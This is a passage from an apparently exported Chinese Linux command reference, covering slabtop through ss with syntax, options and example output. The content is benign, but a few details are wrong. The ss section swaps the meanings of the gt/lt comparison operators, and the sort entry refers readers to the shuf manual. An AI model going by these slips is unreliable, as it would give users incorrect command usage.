size\n*   l: sort by number of slabs\n*   v：sort by number of active slabs\n*   n: sort by name\n*   o: sort by number of objects\n*   p: sort by pages per slab\n*   s: sort by object size\n*   u: sort by cache utilization\n\n###  知识扩展\n\n内核的模块在分配资源的时候，为了提高效率和资源的利用率，都是透过slab来分配的。通过slab的信息，再配合源码能粗粗了解系统的运行情况，比如说什么资源有没有不正常的多，或者什么资源有没有泄漏。linux系统透过/proc/slabinfo来向用户暴露slab的使用情况。\n\nLinux 所使用的 slab 分配器的基础是 Jeff Bonwick 为 SunOS 操作系统首次引入的一种算法。Jeff 的分配器是围绕对象缓存进行的。在内核中，会为有限的对象集（例如文件描述符和其他常见结构）分配大量内存。Jeff 发现对内核中普通对象进行初始化所需的时间超过了对其进行分配和释放所需的时间。因此他的结论是不应该将内存释放回一个全局的内存池，而是将内存保持为针对特定目而初始化的状态。Linux slab 分配器使用了这种思想和其他一些思想来构建一个在空间和时间上都具有高效性的内存分配器。\n\n保存着监视系统中所有活动的 slab 缓存的信息的文件为/proc/slabinfo。\n\n###  实例\n\n```shell\nslabtop\n\n Active / Total Objects (% used)    : 897519 / 1245930 (72.0%)\n Active / Total Slabs (% used)      : 38605 / 38605 (100.0%)\n Active / Total Caches (% used)     : 94 / 145 (64.8%)\n Active / Total Size (% used)       : 129558.22K / 153432.58K (84.4%)\n Minimum / Average / Maximum Object : 0.01K / 0.12K / 128.00K\n\n  OBJS ACTIVE  USE OBJ SIZE  SLABS OBJ/SLAB CACHE SIZE NAME                   \n440136 171471  38%    0.05K   6113       72     24452K buffer_head\n190086 148576  78%    0.05K   2437       78      9748K selinux_inode_security\n151840 146366  96%    0.48K  18980        8     75920K ext3_inode_cache\n144333 144143  99%    0.02K    711      203      2844K avtab_node\n130529 128488  98%    0.13K   4501       29     18004K dentry_cache\n 99214  99071  99%    0.03K    878      113      3512K size-32\n 43834  28475  64%    0.27K   3131       14     12524K radix_tree_node\n 17818   9450  53%    0.06K    302       59      1208K size-64\n  4602   4562  99%    0.05K     59       78       236K sysfs_dir_cache\n  3220   2855  88%    0.08K     70       46       280K vm_area_struct\n  2460   2114  85%    0.12K     82       30       328K size-128\n  1564   1461  93%    0.04K     17       92        68K Acpi-Operand\n  1540   1540 100%    0.33K    140       11       560K inode_cache\n  1524    466  30%    0.01K      6      254        24K anon_vma\n  1440    515  35%    0.05K     20       72        80K avc_node\n  1440   1154  80%    0.19K     72       20       288K filp\n  1170   1023  87%    0.05K     15       78        60K ext3_xattr\n   845    724  85%    0.02K      5      169        20K Acpi-Namespace\n   638    315  49%    0.35K     58       11       232K proc_inode_cache\n   450    434  96%    0.25K     30       15       120K size-256\n   424    386  91%    0.50K     53        8       212K size-512\n   312    107  34%    0.05K      4       78        16K delayacct_cache\n   306    284  92%    0.43K     34        9       136K shmem_inode_cache\n   303    108  35%    0.04K      3      101        12K pid\n   300    261  87%    0.19K     15       20        60K skbuff_head_cache\n   300    300 100%    0.12K     10       30        40K bio\n   260    260 100%   32.00K    260        1      8320K size-32768\n   254      6   2%    0.01K      1      254         4K revoke_table\n   236     55  23%    0.06K      4       59        16K fs_cache\n   216    203  93%    1.00K     54        4       216K size-1024\n   214    214 100%    2.00K    107        2       428K size-2048\n   203     83  40%    0.02K      1      203         4K biovec-1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","slabtop"]},{"title":"【Linux 命令】sleep","url":"/linux-command/sleep/","content":"\n将目前动作延迟一段时间\n\n## 补充说明\n\n**sleep命令** 暂停指定的时间。\n\n###  语法\n\n```shell\nsleep(参数)\n```\n\n###  参数\n\n时间：指定要暂停时间的长度。\n\n时间长度，后面可接 s、m、h 或 d，其中 s 为秒，m 为 分钟，h 为小时，d 为日数。\n\n###  实例\n\n有时在写一些以循环方式运行的监控脚本，设置时间间隔是必不可少的，下面是一个Shell进度条的脚本演示在脚本中生成延时。\n\n```shell\n#!/bin/bash\n\nb=''\nfor ((i=0;$i<=100;i++))\n do\n printf \"Progress:[%-100s]%d%%\\r\" $b $i\n sleep 0.1\n b=#$b\n done\necho\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sleep"]},{"title":"【Linux 命令】slocate","url":"/linux-command/slocate/","content":"\n命令查找文件或目录\n\n## 补充说明\n\n**slocate命令** 是一个命令查找文件或目录。slocate本身具有一个数据库，里面存放了系统中文件与目录的相关信息。\n\n###  语法\n\n```shell\nslocate [-u][--help][--version][-d <目录>][查找的文件]\n```\n\n###  选项\n\n```shell\n-d<目录>或--database=<目录> 　指定数据库所在的目录。\n-u 　更新slocate数据库。\n--help 　显示帮助。\n--version 　显示版本信息。\n```\n\n### 实例\n\n使用指令\"slocate\"显示文件名中含有关键字\"fdisk\"的文件路径信息，输入如下命令：\n\n```shell\n$ slocate fdisk #显示文件名中含有fdisk关键字的文件的路径信息 \n```\n\n执行以上命令后，指令执行的输出信息如下：\n\n```shell\n$ slocate fdisk #显示文件名中含有fdisk 关键字的文件的路径信息  \n/root/cfdisk        #搜索到的文件路径列表  \n/root/fdisk  \n/root/sfdisk  \n/usr/include/grub/ieee1275/ofdisk.h  \n/usr/share/doc/util-Linux/README.cfdisk  \n/usr/share/doc/util-Linux/README.fdisk.gz  \n/usr/share/doc/util-Linux/examples/sfdisk.examples.gz  \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","slocate"]},{"title":"【Linux 命令】smbclient","url":"/linux-command/smbclient/","content":"\n交互方式访问samba服务器\n\n## 补充说明\n\n**smbclient命令** 属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。\n\n###  语法\n\n```shell\nsmbclient(选项)(参数)\n```\n\n###  选项\n\n```shell\n-B<ip地址>：传送广播数据包时所用的IP地址；\n-d<排错层级>：指定记录文件所记载事件的详细程度；\n-E：将信息送到标准错误输出设备；\n-h：显示帮助；\n-i<范围>：设置NetBIOS名称范围；\n-I<IP地址>：指定服务器的IP地址；\n-l<记录文件>：指定记录文件的名称；\n-L：显示服务器端所分享出来的所有资源；\n-M<NetBIOS名称>：可利用WinPopup协议，将信息送给选项中所指定的主机；\n-n<NetBIOS名称>：指定用户端所要使用的NetBIOS名称；\n-N：不用询问密码；\n-O<连接槽选项>：设置用户端TCP连接槽的选项；\n-p<TCP连接端口>：指定服务器端TCP连接端口编号；\n-R<名称解析顺序>：设置NetBIOS名称解析的顺序；\n-s<目录>：指定smb.conf所在的目录；\n-t<服务器字码>：设置用何种字符码来解析服务器端的文件名称；\n-T<tar选项>：备份服务器端分享的全部文件，并打包成tar格式的文件；\n-U<用户名称>：指定用户名称；\n-w<工作群组>：指定工作群组名称。\n```\n\n###  参数\n\nsmb服务器：指定要连接的smb服务器。\n\n###  实例\n\n **列出某个IP地址所提供的共享文件夹** \n\n```shell\nsmbclient -L 198.168.0.1 -U username%password\n```\n\n **像ftp客户端一样使用smbclient** \n\n```shell\nsmbclient //192.168.0.1/tmp  -U username%password\n```\n\n执行smbclient命令成功后，进入smbclient环境，出现提示符：`smb:/>`\n\n这里有许多命令和ftp命令相似，如cd 、lcd、get、megt、put、mput等。通过这些命令，我们可以访问远程主机的共享资源。\n\n **直接一次性使用smbclient命令** \n\n```shell\nsmbclient -c \"ls\"  //192.168.0.1/tmp  -U username%password\n```\n\n和\n\n```shell\nsmbclient //192.168.0.1/tmp  -U username%password\nsmb:/>ls\n```\n\n功能一样的。\n\n **创建一个共享文件夹** \n\n```shell\nsmbclient -c \"mkdir share1\" //192.168.0.1/tmp -U username%password\n```\n\n如果用户共享`//192.168.0.1/tmp`的方式是只读的，会提示`NT_STATUS_ACCESS_DENIED making remote directory /share1`\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","smbclient"]},{"title":"【Linux 命令】smbpasswd","url":"/linux-command/smbpasswd/","content":"\nsamba用户和密码管理工具\n\n## 补充说明\n\n**smbpasswd命令** 属于samba套件，能够实现添加或删除samba用户和为用户修改密码。\n\n###  语法\n\n```shell\nsmbpasswd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：向smbpasswd文件中添加用户；\n-c：指定samba的配置文件；\n-x：从smbpasswd文件中删除用户；\n-d：在smbpasswd文件中禁用指定的用户；\n-e：在smbpasswd文件中激活指定的用户；\n-n：将指定的用户的密码置空。\n```\n\n###  参数\n\n用户名：指定要修改SMB密码的用户。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","smbpasswd"]},{"title":"【Linux 命令】sort","url":"/linux-command/sort/","content":"\n对文本文件中所有行进行排序。\n\n## 概要\n\n```shell\nsort [OPTION]... [FILE]...\nsort [OPTION]... --files0-from=F\n```\n\n## 主要用途\n\n- 将所有输入文件的内容排序后并输出。\n- 当没有文件或文件为`-`时，读取标准输入。\n\n## 选项\n\n排序选项：\n```shell\n-b, --ignore-leading-blanks    忽略开头的空白。\n-d, --dictionary-order         仅考虑空白、字母、数字。\n-f, --ignore-case              将小写字母作为大写字母考虑。\n-g, --general-numeric-sort     根据数字排序。\n-i, --ignore-nonprinting       排除不可打印字符。\n-M, --month-sort               按照非月份、一月、十二月的顺序排序。\n-h, --human-numeric-sort       根据存储容量排序(注意使用大写字母，例如：2K 1G)。\n-n, --numeric-sort             根据数字排序。\n-R, --random-sort              随机排序，但分组相同的行。\n--random-source=FILE           从FILE中获取随机长度的字节。\n-r, --reverse                  将结果倒序排列。\n--sort=WORD                    根据WORD排序，其中: general-numeric 等价于 -g，human-numeric 等价于 -h，month 等价于 -M，numeric 等价于 -n，random 等价于 -R，version 等价于 -V。\n-V, --version-sort             文本中(版本)数字的自然排序。\n```\n\n其他选项：\n```shell\n--batch-size=NMERGE                    一次合并最多NMERGE个输入；超过部分使用临时文件。\n-c, --check, --check=diagnose-first    检查输入是否已排序，该操作不会执行排序。\n-C, --check=quiet, --check=silent      类似于 -c 选项，但不输出第一个未排序的行。\n--compress-program=PROG                使用PROG压缩临时文件；使用PROG -d解压缩。\n--debug                                注释用于排序的行，发送可疑用法的警报到stderr。\n--files0-from=F                        从文件F中读取以NUL结尾的所有文件名称；如果F是 - ，那么从标准输入中读取名字。\n-k, --key=KEYDEF                       通过一个key排序；KEYDEF给出位置和类型。\n-m, --merge                            合并已排序文件，之后不再排序。\n-o, --output=FILE                      将结果写入FILE而不是标准输出。\n-s, --stable                           通过禁用最后的比较来稳定排序。\n-S, --buffer-size=SIZE                 使用SIZE作为内存缓存大小。\n-t, --field-separator=SEP              使用SEP作为列的分隔符。\n-T, --temporary-directory=DIR          使用DIR作为临时目录，而不是 $TMPDIR 或 /tmp；多次使用该选项指定多个临时目录。\n--parallel=N                           将并发运行的排序数更改为N。\n-u, --unique                           同时使用-c，严格检查排序；不同时使用-c，输出排序后去重的结果。\n-z, --zero-terminated                  设置行终止符为NUL（空），而不是换行符。\n--help                                 显示帮助信息并退出。\n--version                              显示版本信息并退出。\n\n\nKEYDEF的格式为：F[.C][OPTS][,F[.C][OPTS]] ，表示开始到结束的位置。\nF表示列的编号\nC表示\nOPTS为[bdfgiMhnRrV]中的一到多个字符，用于覆盖当前排序选项。\n使用--debug选项可诊断出错误的用法。\n\n\nSIZE 可以有以下的乘法后缀:\n% 内存的1%；\nb 1；\nK 1024（默认）；\n剩余的 M, G, T, P, E, Z, Y 可以类推出来。\n```\n\n## 参数\n\nFILE（可选）：要处理的文件，可以为任意数量。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\nsort将文件/文本的每一行作为一个单位相互比较，比较原则是从首字符向后依次按ASCII码值进行比较，最后将他们按升序输出。\n\n```shell\nroot@[mail text]# cat sort.txt\naaa:10:1.1\nccc:30:3.3\nddd:40:4.4\nbbb:20:2.2\neee:50:5.5\neee:50:5.5\n\n[root@mail text]# sort sort.txt\naaa:10:1.1\nbbb:20:2.2\nccc:30:3.3\nddd:40:4.4\neee:50:5.5\neee:50:5.5\n```\n\n忽略相同行使用`-u`选项或者`uniq`：\n\n```shell\n[root@mail text]# cat sort.txt\naaa:10:1.1\nccc:30:3.3\nddd:40:4.4\nbbb:20:2.2\neee:50:5.5\neee:50:5.5\n\n[root@mail text]# sort -u sort.txt\naaa:10:1.1\nbbb:20:2.2\nccc:30:3.3\nddd:40:4.4\neee:50:5.5\n\n[root@mail text]# uniq sort.txt\naaa:10:1.1\nccc:30:3.3\nddd:40:4.4\nbbb:20:2.2\neee:50:5.5\n```\n\n`sort`的`-n、-r、-k、-t`选项的使用：\n\n```shell\n[root@mail text]# cat sort.txt\nAAA:BB:CC\naaa:30:1.6\nccc:50:3.3\nddd:20:4.2\nbbb:10:2.5\neee:40:5.4\neee:60:5.1\n\n# 将BB列按照数字从小到大顺序排列：\n[root@mail text]# sort -nk 2 -t: sort.txt\nAAA:BB:CC\nbbb:10:2.5\nddd:20:4.2\naaa:30:1.6\neee:40:5.4\nccc:50:3.3\neee:60:5.1\n\n# 将CC列数字从大到小顺序排列：\n# -n是按照数字大小排序，-r是以相反顺序，-k是指定需要排序的栏位，-t指定栏位分隔符为冒号\n[root@mail text]# sort -nrk 3 -t: sort.txt\neee:40:5.4\neee:60:5.1\nddd:20:4.2\nccc:50:3.3\nbbb:10:2.5\naaa:30:1.6\nAAA:BB:CC\n```\n\n关于`-k`选项的解读和例子：\n\n-k选项深度解读：\n\n```shell\nFStart.CStart Modifier,FEnd.CEnd Modifier\n-------Start--------,-------End--------\n FStart.CStart 选项  ,  FEnd.CEnd 选项\n```\n\n这个语法格式可以被其中的逗号`,`分为两大部分，**Start** 部分和 **End** 部分。\nStart部分由三部分组成，其中的Modifier部分就是我们之前说过的选项部分；\n我们重点说说`Start`部分的`FStart`和`C.Start`；`C.Start`是可以省略的，省略的话就表示从本域的开头部分开始。`FStart.CStart`，其中`FStart`就是表示使用的域，而`CStart`则表示在`FStart`域中从第几个字符开始算排序首字符。\n同理，在End部分中，你可以设定`FEnd.CEnd`，如果你省略`.CEnd`或将它设定为0，则表示结尾到本域的最后一个字符。\n\n\n例子：从公司英文名称的第二个字母开始排序：\n\n```shell\n$ sort -t ' ' -k 1.2 facebook.txt\nbaidu 100 5000\nsohu 100 4500\ngoogle 110 5000\nguge 50 3000\n```\n\n解读：使用了`-k 1.2`，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现baidu因为第二个字母是a而名列榜首。sohu和google第二个字符都是o，但sohu的h在google的o前面，所以两者分别排在第二和第三。guge只能屈居第四了。\n\n\n例子：只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序：\n\n```shell\n$ sort -t ' ' -k 1.2,1.2 -nrk 3,3 facebook.txt\nbaidu 100 5000\ngoogle 110 5000\nsohu 100 4500\nguge 50 3000\n```\n\n解读：由于只对第二个字母进行排序，所以我们使用了`-k 1.2,1.2`的表示方式，表示我们只对第二个字母进行排序（如果你问我使用`-k 1.2`怎么不行？当然不行，因为你省略了End部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。\n对员工工资进行排序，我们也使用了`-k 3,3`，这是最准确的表述，表示我们只对本域进行排序，因为如果你省略了后面的3，就变成了我们对第3个域开始到最后一个域位置的内容进行排序了。\n\n\n### 注意\n\n1. [关于-g和-n选项的区别：stackoverflow](https://stackoverflow.com/questions/1255782/whats-the-difference-between-general-numeric-sort-and-numeric-sort-options)\n\n2. 关于这个复杂命令的学习，建议您阅读info文档及参考博客、问答网站等。\n\n3. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 shuf`，`info coreutils 'shuf invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sort"]},{"title":"【Linux 命令】source","url":"/linux-command/source/","content":"\n在当前Shell环境中从指定文件读取和执行命令。\n\n### 概要\n\nsource filename [arguments]\n\n### 主要用途\n\n- 执行文件并从文件中加载变量及函数到执行环境\n\n#### 参数\n\nfilename：要执行的文件\n\narguments（可选）：传递给文件的参数\n\n#### 返回值\n\nsource返回文件最后一个命令的返回值，如果文件不能读取则会失败\n\n#### 错误用法\n\n- 文件在`$PATH`中找不到。\n\n- 文件未给出。\n\n### 例子\n\n- 在一些工具的执行过程中，会把环境变量设置以\"export XXX=XXXXXX\"或\"declare XXX=XXXXXX\"的形式导出到\n一个文件中，然后用source加载该文件内容到执行环境中。\n\n- 读取和执行/root/.bash_profile文件。\n\n```shell\n[root@localhost ~]# source ~/.bash_profile\n```\n\n### Q&A\n\nQ：`source`和`sh`在执行文件方面有什么区别？\n\nA：`sh`的执行是在子shell中，`source`会使得被执行文件的变量及函数加载进当前终端环境内（除去函数内local修饰的变量等）；建议您参考`export`命令的 **知识点** 部分\n\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看 `help` 命令。\n\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","source"]},{"title":"【Linux 命令】speedtest-cli","url":"/linux-command/speedtest-cli/","content":"\n命令行下测试服务器外网速度\n\n## 补充说明\n\n**speedtest-cli** 是一个使用python编写的命令行脚本，通过调用speedtest.net测试上下行的接口来完成速度测试，最后我会测试运维生存时间所在服务器的外网速度。项目地址：https://github.com/sivel/speedtest-cli\n\n###  安装speedtest－cli\n\nspeedtest-cli需要在python 2.4-3.4的环境下，安装方法都很简单，自己选择以下最适合你的一种。\n\n **pip方式** \n\n```shell\n＃ pip install speedtest－cli\n```\n\n **easy_install方式** \n\n```shell\n＃ easy_install speedtest-cli\n```\n\n **github＋pip方式** \n\n```shell\n＃ pip install git+https://github.com/sivel/speedtest-cli.git\n```\n\n或者\n\n```shell\n＃ git clone https://github.com/sivel/speedtest-cli.git\n＃ python speedtest-cli/setup.py install\n```\n\n **下载脚本方式** \n\n```shell\n＃ wget -O speedtest-cli https://raw.github.com/sivel/spe ... er/speedtest_cli.py\n＃ chmod +x speedtest-cli\n```\n\n或者\n\n```shell\n＃ curl -o speedtest-cli https://raw.github.com/sivel/spe ... er/speedtest_cli.py\n＃ chmod +x speedtest-cli\n```\n\n直接下载脚本，给予执行权限即可。\n\n###  用法\n\n```shell\n-h, --help       show this help message and exit\n--share          分享你的网速，该命令会在speedtest网站上生成网速测试结果的图片。\n--simple         Suppress verbose output, only show basic information\n--list           根据距离显示speedtest.net的测试服务器列表。\n--server=SERVER  指定列表中id的服务器来做测试。\n--mini=MINI      URL of the Speedtest Mini server\n--source=SOURCE  Source ip address to bind to\n--version        Show the version number and exit\n```\n\n###  实例\n\n列出所有在中国的测试服务器：\n\n```shell\n[root@li229-122 ~]# speedtest-cli --list | grep China\n1185) China Unicom (Changchun, China) [10534.35 km]\n3784) China Mobile (Urumqi, China) [10581.15 km]\n2667) Beijing Normal University (Beijing, China) [11117.03 km]\n2529) Beijing Normal University (Beijing, China) [11117.03 km]\n2816) Capital Online Data service (Beijing, China) [11117.03 km]\n4354) SXmobile (Taiyuan, China) [11383.17 km]\n3973) China Telecom (Lanzhou, China) [11615.43 km]\n3633) China Telecom (Shanghai, China) [11983.37 km]\n3927) China Mobile Jiangsu Co., Ltd. (Suzhou, China) [11989.27 km]\n2461) China Unicom (Chengdu, China) [12213.35 km]\n1028) Shepherd Software (Xiamen, China) [12785.57 km]\n1628) Xiamen Guangdian Xinxu (Xiamen, China) [12785.57 km]\n3891) GZinternet (Guangzhou, China) [13005.36 km]\n3871) SZWCDMA (Shenzhen, China) [13059.20 km]\n3819) SZU (Shenzhen, China) [13059.20 km]\n1536) STC (Hong Kong, China) [13088.37 km]\n1890) Telin (Hong Kong, China) [13088.37 km]\n```\n\n **结果解释** \n\n```shell\n3633) China Telecom (Shanghai, China) [11983.37 km]\n```\n\n```shell\n3633: 服务器id\nchina telecom：isp，这里是中国电信\nshanghai,china ：服务器所在地址\n11983.37 km：两台服务器地理位置之间距离，我这台机器在美国，和上海相距11983.37公里，很远呐.\n```\n\n **外网速度测试** \n\n```shell\n[root@li229-122 ~]# speedtest-cli --server=3633 --share\nRetrieving speedtest.net configuration...\nRetrieving speedtest.net server list...\nTesting from Linode (173.255.219.122)...\nHosted by China Telecom (Shanghai) [11983.37 km]: 23.603 ms\nTesting download speed........................................\nDownload: 24.84 Mbit/s\nTesting upload speed..................................................\nUpload: 4.57 Mbit/s\nShare results: http://www.speedtest.net/result/3240988007.png\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","speedtest-cli"]},{"title":"【Linux 命令】spell","url":"/linux-command/spell/","content":"\n对文件进行拼写检查\n\n## 补充说明\n\n**spell命令** 对文件进行拼写检查，并把拼写错误的单词输出。\n\n###  语法\n\n```shell\nspell(参数)\n```\n\n###  参数\n\n文件：指定需要进行拼写检查的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","spell"]},{"title":"【Linux 命令】split","url":"/linux-command/split/","content":"\n分割任意大小的文件\n\n## 补充说明\n\n**split命令** 可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。\n\n###  选项\n\n```shell\n-b：值为每一输出档案的大小，单位为 byte。\n-C：每一输出档中，单行的最大 byte 数。\n-d：使用数字作为后缀。\n-l：值为每一输出档的行数大小。\n-a：指定后缀长度(默认为2)。\n```\n\n###  实例\n\n生成一个大小为100KB的测试文件：\n\n```shell\n[root@localhost split]# dd if=/dev/zero bs=100k count=1 of=date.file\n1+0 records in\n1+0 records out\n102400 bytes (102 kB) copied, 0.00043 seconds, 238 MB/s\n```\n\n使用split命令将上面创建的date.file文件分割成大小为10KB的小文件：\n\n```shell\n[root@localhost split]# split -b 10k date.file \n[root@localhost split]# ls\ndate.file  xaa  xab  xac  xad  xae  xaf  xag  xah  xai  xaj\n```\n\n文件被分割成多个带有字母的后缀文件，如果想用数字后缀可使用-d参数，同时可以使用-a length来指定后缀的长度：\n\n```shell\n[root@localhost split]# split -b 10k date.file -d -a 3\n[root@localhost split]# ls\ndate.file  x000  x001  x002  x003  x004  x005  x006  x007  x008  x009\n```\n\n为分割后的文件指定文件名的前缀：\n\n```shell\n[root@localhost split]# split -b 10k date.file -d -a 3 split_file\n[root@localhost split]# ls\ndate.file  split_file000  split_file001  split_file002  split_file003  split_file004  split_file005  split_file006  split_file007  split_file008  split_file009\n```\n\n使用-l选项根据文件的行数来分割文件，例如把文件分割成每个包含10行的小文件：\n\n```shell\nsplit -l 10 date.file\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","split"]},{"title":"【Linux 命令】squid","url":"/linux-command/squid/","content":"\nsquid服务器守护进程\n\n## 补充说明\n\n**squid命令** 高性能的Web客户端代理缓存服务器套件“squid”的服务器守护进程。\n\n###  语法\n\n```shell\nsquid(选项)\n```\n\n###  选项\n\n```shell\n-d：将指定调试等级的信息发送到标准错误设备；\n-f：使用指定的配置文件。而不使用默认配置文件；\n-k：向squid服务器发送指令；\n-s：启用syslog日志；\n-z：创建缓存目录；\n-C：不捕获致命信号；\n-D：不进行DNS参数测试；\n-N：以非守护进程模式运行；\n-X：强制进入完全调试模式。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","squid"]},{"title":"【Linux 命令】squidclient","url":"/linux-command/squidclient/","content":"\nsquid服务器的客户端管理工具\n\n## 补充说明\n\n**squidclient命令** 使用squid服务器的客户端管理工具，它可以查看squid服务器的详细运行信息和管理squid服务器。\n\n###  语法\n\n```shell\nsquidclient(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：不包含“accept:header”；\n-r：强制缓存重新加载URL；\n-s：安静模式，不输出信息到标准输出设备；\n-h：从指定主机获取url\n-l：指定一个本地ip地址进行绑定；\n-p：端口号，默认为3128；\n-m：指定发送请求的方法；\n-u：代理认证用户名。\n```\n\n###  参数\n\nURL：指定操作缓存中的URL。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","squidclient"]},{"title":"【Linux 命令】ss","url":"/linux-command/ss/","content":"\n比 netstat 好用的socket统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息\n\n## 补充说明\n\n**ss命令** 用来显示处于活动状态的套接字信息。ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。\n\n当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接`cat /proc/net/tcp`，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。\n\n天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。当然，如果你的系统中没有tcp_diag，ss也可以正常运行，只是效率会变得稍慢。\n\n### 语法\n\n```shell\nss [参数]\nss [参数] [过滤]\n```\n\n### 选项\n\n```shell\n-h, --help      帮助信息\n-V, --version   程序版本信息\n-n, --numeric   不解析服务名称\n-r, --resolve   解析主机名\n-a, --all       显示所有套接字（sockets）\n-l, --listening 显示监听状态的套接字（sockets）\n-o, --options   显示计时器信息\n-e, --extended  显示详细的套接字（sockets）信息\n-m, --memory    显示套接字（socket）的内存使用情况\n-p, --processes 显示使用套接字（socket）的进程\n-i, --info      显示 TCP内部信息\n-s, --summary   显示套接字（socket）使用概况\n-4, --ipv4      仅显示IPv4的套接字（sockets）\n-6, --ipv6      仅显示IPv6的套接字（sockets）\n-0, --packet    显示 PACKET 套接字（socket）\n-t, --tcp       仅显示 TCP套接字（sockets）\n-u, --udp       仅显示 UCP套接字（sockets）\n-d, --dccp      仅显示 DCCP套接字（sockets）\n-w, --raw       仅显示 RAW套接字（sockets）\n-x, --unix      仅显示 Unix套接字（sockets）\n-f, --family=FAMILY  显示 FAMILY类型的套接字（sockets），FAMILY可选，支持  unix, inet, inet6, link, netlink\n-A, --query=QUERY, --socket=QUERY\n      QUERY := {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY]\n-D, --diag=FILE     将原始TCP套接字（sockets）信息转储到文件\n -F, --filter=FILE  从文件中都去过滤器信息\n       FILTER := [ state TCP-STATE ] [ EXPRESSION ]\n```\n\n### 实例\n\n```shell\nss -t -a    # 显示TCP连接\nss -s       # 显示 Sockets 摘要\nss -l       # 列出所有打开的网络连接端口\nss -pl      # 查看进程使用的socket\nss -lp | grep 3306  # 找出打开套接字/端口应用程序\nss -u -a    显示所有UDP Sockets\nss -o state established '( dport = :smtp or sport = :smtp )' # 显示所有状态为established的SMTP连接\nss -o state established '( dport = :http or sport = :http )' # 显示所有状态为Established的HTTP连接\nss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 193.233.7/24  # 列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字\n\n# ss 和 netstat 效率对比\ntime netstat -at\ntime ss\n\n# 匹配远程地址和端口号\n# ss dst ADDRESS_PATTERN\nss dst 192.168.1.5\nss dst 192.168.119.113:http\nss dst 192.168.119.113:smtp\nss dst 192.168.119.113:443\n\n# 匹配本地地址和端口号\n# ss src ADDRESS_PATTERN\nss src 192.168.119.103\nss src 192.168.119.103:http\nss src 192.168.119.103:80\nss src 192.168.119.103:smtp\nss src 192.168.119.103:25\n```\n\n**将本地或者远程端口和一个数比较**\n\n```shell\n# ss dport OP PORT 远程端口和一个数比较；\n# ss sport OP PORT 本地端口和一个数比较\n# OP 可以代表以下任意一个:\n# <= or le : 小于或等于端口号\n# >= or ge : 大于或等于端口号\n# == or eq : 等于端口号\n# != or ne : 不等于端口号\n# < or gt : 小于端口号\n# > or lt : 大于端口号\nss  sport = :http\nss  dport = :http\nss  dport \\> :1024\nss  sport \\> :1024\nss sport \\< :32000\nss  sport eq :22\nss  dport != :22\nss  state connected sport = :http\nss \\( sport = :http or sport = :https \\)\nss -o state fin-wait-1 \\( sport = :http or sport = :https \\) dst 192.168.1/24\n```\n\n**用TCP 状态过滤Sockets**\n\n```shell\nss -4 state closing\n# ss -4 state FILTER-NAME-HERE\n# ss -6 state FILTER-NAME-HERE\n# FILTER-NAME-HERE 可以代表以下任何一个：\n# established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、\n# all : 所有以上状态\n# connected : 除了listen and closed的所有状态\n# synchronized :所有已连接的状态除了syn-sent\n# bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv.\n# big : 和bucket相反.\n```\n\n **显示ICP连接**\n\n```shell\n[root@localhost ~]# ss -t -a\nState       Recv-Q Send-Q                            Local Address:Port                                Peer Address:Port\nLISTEN      0      0                                             *:3306                                           *:*\nLISTEN      0      0                                             *:http                                           *:*\nLISTEN      0      0                                             *:ssh                                            *:*\nLISTEN      0      0                                     127.0.0.1:smtp                                           *:*\nESTAB       0      0                                112.124.15.130:42071                              42.156.166.25:http\nESTAB       0      0                                112.124.15.130:ssh                              121.229.196.235:33398\n```\n\n **显示 Sockets 摘要**\n\n```shell\n[root@localhost ~]# ss -s\nTotal: 172 (kernel 189)\nTCP:   10 (estab 2, closed 4, orphaned 0, synrecv 0, timewait 0/0), ports 5\n\nTransport Total     ip        IPv6\n*         189       -         -\nRAW       0         0         0\nUDP       5         5         0\nTCP       6         6         0\nINET      11        11        0\nFRAG      0         0         0\n```\n\n列出当前的established, closed, orphaned and waiting TCP sockets\n\n **列出所有打开的网络连接端口**\n\n```shell\n[root@localhost ~]# ss -l\nRecv-Q Send-Q                                 Local Address:Port                                     Peer Address:Port\n0      0                                                  *:3306                                                *:*\n0      0                                                  *:http                                                *:*\n0      0                                                  *:ssh                                                 *:*\n0      0                                          127.0.0.1:smtp                                                *:*\n```\n\n 